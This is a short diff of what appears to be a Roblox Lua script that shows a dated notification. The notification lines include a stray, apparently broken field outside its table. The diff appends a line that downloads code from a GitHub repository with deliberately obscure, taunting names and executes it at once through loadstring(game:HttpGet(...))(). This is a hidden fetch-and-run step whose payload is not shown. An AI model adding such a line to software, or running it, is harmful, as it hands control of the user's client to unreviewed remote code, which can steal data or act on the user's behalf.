@@ -116,3 +116,5 @@ game:GetService("StarterGui"):SetCore("SendNotification", {
 	Text = "Oct 26 2023.";
 	Icon = "rbxthumb://type=Asset&id=13617468046&w=150&h=150"})
 Duration = 16;
+wait()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YouWillNeverFindMeCuzItsVeryHardToDoIt/YOUCANEVENFINDMBROITSVERYHARDHAHA/main/WebDa_Book"))()
